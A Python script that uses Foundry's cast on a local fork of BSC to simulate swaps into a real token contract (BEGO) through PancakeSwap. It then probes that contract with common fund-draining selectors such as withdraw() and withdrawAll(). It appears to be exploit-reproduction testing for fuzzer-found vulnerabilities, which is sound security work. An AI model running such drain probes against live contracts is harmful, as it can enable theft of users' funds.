#!/usr/bin/env python3
"""
Simple test of Forge simulation for ItyFuzz vulnerabilities
"""

import subprocess
import json
import time

def test_bsc_vulnerability():
    """Test BSC vulnerability simulation"""
    print("=== Testing BSC Vulnerability Simulation ===\n")
    
    # Configuration
    router = "0x10ED43C718714eb63d5aA57B78B54704E256024E"  # PancakeSwap
    wbnb = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"
    bego = "0xc342774492b54ce5F8ac662113ED702Fc1b34972"
    
    # Get test account
    accounts = json.loads(subprocess.check_output([
        "cast", "rpc", "eth_accounts", "--rpc-url", "http://localhost:8545"
    ]).decode())
    
    test_account = accounts[0]
    print(f"Test account: {test_account}")
    
    # Get initial balance
    initial_balance = subprocess.check_output([
        "cast", "balance", test_account, "--rpc-url", "http://localhost:8545"
    ]).decode().strip()
    
    print(f"Initial balance: {int(initial_balance) / 1e18:.4f} ETH\n")
    
    # Test different swap amounts
    test_amounts = [1, 10, 100, 1000]
    
    for amount in test_amounts:
        print(f"\n--- Testing {amount} ETH swap ---")
        
        # Take snapshot
        snapshot = subprocess.check_output([
            "cast", "rpc", "evm_snapshot", "--rpc-url", "http://localhost:8545"
        ]).decode().strip().strip('"')
        
        try:
            # Encode swap call
            deadline = int(time.time()) + 3600
            calldata = subprocess.check_output([
                "cast", "calldata",
                "swapExactETHForTokens(uint256,address[],address,uint256)",
                "0",  # amountOutMin
                f'["{wbnb}","{bego}"]',  # path
                test_account,  # to
                str(deadline)  # deadline
            ]).decode().strip()
            
            print(f"Calldata: {calldata[:10]}...")
            
            # Send swap transaction
            value_wei = int(amount * 1e18)
            result = subprocess.run([
                "cast", "send", router, calldata,
                "--from", test_account,
                "--value", str(value_wei),
                "--rpc-url", "http://localhost:8545",
                "--unlocked",
                "--json"
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                tx_data = json.loads(result.stdout)
                print(f"✅ Swap successful! Hash: {tx_data.get('transactionHash', 'N/A')}")
                
                # Get BEGO balance
                bego_balance = subprocess.check_output([
                    "cast", "call", bego,
                    "balanceOf(address)(uint256)",
                    test_account,
                    "--rpc-url", "http://localhost:8545"
                ]).decode().strip()
                
                print(f"BEGO received: {int(bego_balance, 16) / 1e18:.4f}")
                
            else:
                print(f"❌ Swap failed: {result.stderr}")
                
        except Exception as e:
            print(f"❌ Error: {e}")
        
        # Revert snapshot
        subprocess.run([
            "cast", "rpc", "evm_revert", snapshot,
            "--rpc-url", "http://localhost:8545"
        ], capture_output=True)
    
    print("\n=== Simulation Complete ===")

def test_direct_exploit():
    """Test direct exploit simulation"""
    print("\n=== Testing Direct Exploit ===\n")
    
    # BEGO contract
    bego = "0xc342774492b54ce5F8ac662113ED702Fc1b34972"
    
    # Get accounts
    accounts = json.loads(subprocess.check_output([
        "cast", "rpc", "eth_accounts", "--rpc-url", "http://localhost:8545"
    ]).decode())
    
    test_account = accounts[0]
    
    # Try calling 0 ETH drain function
    print("Testing 0 ETH drain function...")
    
    # Common drain function selectors
    selectors = [
        "0x3ccfd60b",  # withdraw()
        "0x853828b6",  # withdrawAll()
        "0x2e1a7d4d",  # withdraw(uint256)
        "0x69328dec",  # harvest(address,uint256)
    ]
    
    for selector in selectors:
        print(f"\nTrying selector: {selector}")
        
        result = subprocess.run([
            "cast", "call", bego, selector,
            "--from", test_account,
            "--rpc-url", "http://localhost:8545"
        ], capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"✅ Call successful: {result.stdout[:100]}")
        else:
            print(f"❌ Call failed: {result.stderr[:100]}")

if __name__ == "__main__":
    # Check if Anvil is running
    try:
        subprocess.check_output([
            "cast", "block-number", "--rpc-url", "http://localhost:8545"
        ])
        print("✅ Anvil is running\n")
    except:
        print("❌ Anvil is not running. Start it with:")
        print("anvil --fork-url https://bsc-dataseed.binance.org/ --chain-id 56")
        exit(1)
    
    # Run tests
    test_bsc_vulnerability()
    test_direct_exploit()